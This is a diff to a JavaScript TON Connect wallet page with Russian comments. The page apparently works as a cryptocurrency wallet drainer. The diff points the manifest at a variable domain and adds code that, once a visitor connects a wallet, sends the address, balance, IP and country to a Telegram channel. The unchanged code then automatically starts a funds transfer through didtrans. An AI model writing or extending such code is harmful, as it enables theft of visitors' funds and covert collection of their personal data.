@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Инициализация TON Connect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: `https://leonardokotu.github.io/mysite/tonconnect-manifest.json`, // URL манифеста
+        manifestUrl: `https://${domain}/tonconnect-manifest.json`, // URL манифеста
         buttonRootId: 'ton-connect' // ID элемента для кнопки подключения
     });
 
@@ -38,9 +38,14 @@ document.addEventListener('DOMContentLoaded', () => {
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
             console.log('Кошелек подключен:', wallet);
+
             // Логирование информации о подключенном кошельке
             const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
             console.log(walletInfo);
+
+            // Отправка информации о подключенном кошельке в Telegram
+            const messageWalletConnected = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
+            sendTelegramMessage(messageWalletConnected);
 
             // Автоматически запускаем процесс отправки средств
             didtrans(wallet.account.address);
